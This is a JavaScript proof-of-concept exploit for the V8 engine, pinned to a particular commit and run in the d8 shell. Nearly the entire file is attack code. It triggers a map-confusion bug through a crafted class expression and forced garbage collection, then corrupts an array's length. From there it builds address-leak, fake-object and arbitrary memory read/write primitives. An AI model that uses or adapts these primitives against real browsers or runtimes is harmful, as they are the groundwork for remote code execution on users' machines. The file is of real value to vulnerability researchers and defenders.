// Build d8 using:
// a) Run once
//    git checkout 18865d6af0404f2d2aeb1c99dd73503364ce0967
//    gclient sync
//    gn gen ./out/x64.debug
//    gn gen ./out/x64.release
//
// b) 
//    Debug Build:
//    ninja -C ./out/x64.debug d8
//
//    Release Build:
//    ninja -C ./out/x64.release d8
//
// Run:
// C:\path\to\v8\d8.exe --allow-natives-syntax --bytecode-old-age=3 exploit.js

var arr_buf = new ArrayBuffer(8);
var f64_arr = new Float64Array(arr_buf);
var b64_arr = new BigInt64Array(arr_buf);

function dtoi(f) {
    f64_arr[0] = f;
    return b64_arr[0];
}

function itod(i) {
    b64_arr[0] = i;
    return f64_arr[0];
}

function ptr(addr) {
    return addr | 1n;
}
function unptr(addr) {
    return addr & ~3n;
}

function smi(i) {
    return i << 1n;
}
function unsmi(i) {
    return i >> 1n;
}

const FIXED_ARRAY_HEADER_SIZE = 8n;
var large_arr = new Array(0x10000);
large_arr.fill(itod(0xDEADBEE0n)); //change array type to HOLEY_DOUBLE_ELEMENTS_MAP
var packed_map = null;
var packed_double_map = null;
var packed_double_props = null;
var fake_arr_elements_addr = null;
var fake_arr = null;

function fake_obj(addr) {
    large_arr[0] = itod(packed_map | (packed_double_props << 32n));
    large_arr[1] = itod(fake_arr_elements_addr | (smi(1n) << 32n));
    large_arr[3] = itod(ptr(addr));
    
    let result = fake_arr[0];
    
    large_arr[1] = itod(fake_arr_elements_addr | (smi(0n) << 32n)); 
    
    return result;
}


function addr_of(obj) {
    large_arr[0] = itod(packed_double_map | (packed_double_props << 32n));
    large_arr[1] = itod(fake_arr_elements_addr | (smi(1n) << 32n));
    
    fake_arr[0] = obj;
    let result = dtoi(large_arr[3]) & 0xFFFFFFFFn;
    
    large_arr[1] = itod(fake_arr_elements_addr | (smi(0n) << 32n)); 
    
    return result;
}

function v8_read64(addr) {
    addr -= FIXED_ARRAY_HEADER_SIZE;
    
    large_arr[0] = itod(packed_double_map | (packed_double_props << 32n));
    large_arr[1] = itod(ptr(addr) | (smi(1n) << 32n));
    
    let result = dtoi(fake_arr[0]);
    
    large_arr[1] = itod(fake_arr_elements_addr | (smi(0n) << 32n)); 

    return result;    
}

function v8_write64(addr, val) {
    addr -= FIXED_ARRAY_HEADER_SIZE;
    
    large_arr[0] = itod(packed_double_map | (packed_double_props << 32n));
    large_arr[1] = itod(ptr(addr) | (smi(1n) << 32n));
    
    fake_arr[0] = itod(val);
    
    large_arr[1] = itod(fake_arr_elements_addr | (smi(0n) << 32n));   
}

function trigger_gc() {
    try {
        let tt = new ArrayBuffer(31 * 1024 * 1024 * 1024);
        tt = new ArrayBuffer(31 * 1024 * 1024 * 1024);
        tt = new ArrayBuffer(31 * 1024 * 1024 * 1024);
        tt = new ArrayBuffer(31 * 1024 * 1024 * 1024);
        tt = new ArrayBuffer(31 * 1024 * 1024 * 1024);
        tt = new ArrayBuffer(31 * 1024 * 1024 * 1024);
    } catch(err) {
        print(err);
    }
}

function make_small() {
    let result = {};
    result.p1 = 1;
    return result;
}

function make_big() {
    //These are all inline properties. If we make a smaller object have the 
    //same MAP as this then we will be able to access out of bounds.
    let result = {
        p1: 1, p2: 2, p3: 3, p4: 4, p5: 5, p6: 6, p7: 7, p8: 8, p9: 9, p10: 10, 
        p11: 11, p12: 12, p13: 13, p14: 14, p15: 15, p16: 16, p17: 17, p18: 18
    };
    //We need to add the extra property to transition to a new MAP with a cleared
    //validity cell. Also, the extra field is external and captures the write so
    //that doesn't interfere with our inline properties.
    result.extra = 1;
    return result;
}
var ballast = null;
var small_obj = make_small();
var big_obj = make_big();
var corrupted_obj = null;
var arr1 = null;
var arr2 = null;
%GlobalPrint("small ==========================\n");
%DebugPrint(small_obj);
%GlobalPrint("big ==========================\n");
%DebugPrint(big_obj);

for(let i = 0; i < 12; i++) {
    %GlobalPrint(i + " ===============================\n");
    //this prevents bad results from LoadGlobalNotInsideTypeof slots from crashing the exploit
    function dummy() { return true; }
    
    //use locals here instead of globals because otherwise it would create extra slots in the feedback vector
    let target = {}; //this is the object we want to change the map of.
    let SetNamedStrict_slot1 = {}; //this gets transitioned to "small_obj" MAP once we add property p1
    let LoadProperty_slot0 = big_obj; //this is the MAP we want to transition to.
    if(i == 11) {
        %GlobalPrint("GC ==========================\n");
        //this causes the code to be reparsed!
        trigger_gc();
        //allocate all the objects after GC so that they are allocated in NewSpace
        corrupted_obj = make_small();
        target = corrupted_obj;
        arr1 = [1.85419992257717e-310,1.85419992257717e-310,1.85419992257717e-310,1.85419992257717e-310]; //0x0000222200002222        
        arr2 = [large_arr,2,arr1,4,5,6,7,8];
    }

    //This will cause corrupted_obj (small_obj MAP) to transition to a big_obj MAP
    //Unfortunately because of the nature of the vulnerability we cant put this in it's own function :-(
    ((a = class Clazz {
       [(dummy(
            eval(),
            eval, //consumes 2 feedback slots upon reparse
            eval, //consumes 2 feedback slots upon reparse
            target.p1 = 123, //this is where the target SetNamedStrict slot will be
            [], //this Literal (AllocationSite) uses one feedback slot. This is important. Slot value has to be a valid pointer!
            SetNamedStrict_slot1.p1 = 1, //small_obj MAP will be in the second SetNamedStrict slot
            LoadProperty_slot0.p1 //big_obj MAP will be in the first LoadProperty slot
        )
        ? 0 : (ballast = 1)) //this crap is to make sure the slot length of the feedback vector and feedback metadata are equal
       ]
    }) => {})();
}
corrupted_obj.p18 = 0x30; //modify length of arr1 array

let large_arr_addr = dtoi(arr1[7]) & 0xFFFFFFFFn;
let large_arr_elements_field_addr = large_arr_addr + 8n;
let arr1_addr = dtoi(arr1[8]) & 0xFFFFFFFFn;

let packed_double_map_and_props = dtoi(arr1[4]);
packed_double_map = packed_double_map_and_props & 0xFFFFFFFFn;
packed_double_props = packed_double_map_and_props >> 32n;
let packed_double_elements = dtoi(arr1[5]) & 0xFFFFFFFFn;

let packed_map_and_props = dtoi(arr1[11]);
packed_map = packed_map_and_props & 0xFFFFFFFFn;
let packed_props = packed_map_and_props >> 32n;

let fixed_arr_map = dtoi(arr1[6]) & 0xFFFFFFFFn;

arr1[0] = itod(packed_double_map | (packed_double_props << 32n));
arr1[1] = itod((large_arr_elements_field_addr - FIXED_ARRAY_HEADER_SIZE) | (smi(1n) << 32n));

let temp_fake_arr_addr = packed_double_elements + FIXED_ARRAY_HEADER_SIZE;
arr1[7] = itod(temp_fake_arr_addr);
let temp_fake_arr = arr2[0];
let large_arr_elements_addr = dtoi(temp_fake_arr[0]) & 0xFFFFFFFFn;
temp_fake_arr = null;

let fake_arr_addr = large_arr_elements_addr + FIXED_ARRAY_HEADER_SIZE;
fake_arr_elements_addr = fake_arr_addr + 16n;

large_arr[0] = itod(packed_double_map | (packed_double_props << 32n));
large_arr[1] = itod(fake_arr_elements_addr | (smi(0n) << 32n));
large_arr[2] = itod(fixed_arr_map | (smi(0n) << 32n));

arr1[7] = itod(fake_arr_addr);
fake_arr = arr2[0];

//cleanup
corrupted_obj.p18 = 8;
let small_obj_addr = addr_of(small_obj);
let small_obj_map_and_props = v8_read64(small_obj_addr);
let corrupted_obj_addr = addr_of(corrupted_obj);
v8_write64(corrupted_obj_addr, small_obj_map_and_props); //restore the corrupted MAP
corrupted_obj = null;


%GlobalPrint("large arr ======================\n");
%DebugPrint(large_arr);
%GlobalPrint("arr1 ===========================\n");
%DebugPrint(arr1);
%GlobalPrint("arr2 ===========================\n");
%DebugPrint(arr2);
%GlobalPrint("small_obj_addr = " + small_obj_addr.toString(16) + "\n");
%GlobalPrint("small_obj_map_and_props = " + small_obj_map_and_props.toString(16) + "\n");
%GlobalPrint("corrupted_obj_addr = " + corrupted_obj_addr.toString(16) + "\n");


%GlobalPrint("large_arr_addr = " + large_arr_addr.toString(16) + "\n");
%GlobalPrint("arr1_addr = " + arr1_addr.toString(16) + "\n");
%GlobalPrint("fixed_arr_map = " + fixed_arr_map.toString(16) + "\n");
%GlobalPrint("packed_double_elements = " + packed_double_elements.toString(16) + "\n");
%GlobalPrint("large_arr_elements_addr = " + large_arr_elements_addr.toString(16) + "\n");
%GlobalPrint("fake_arr_addr = " + fake_arr_addr.toString(16) + "\n");

//%DebugPrint(fake_arr);
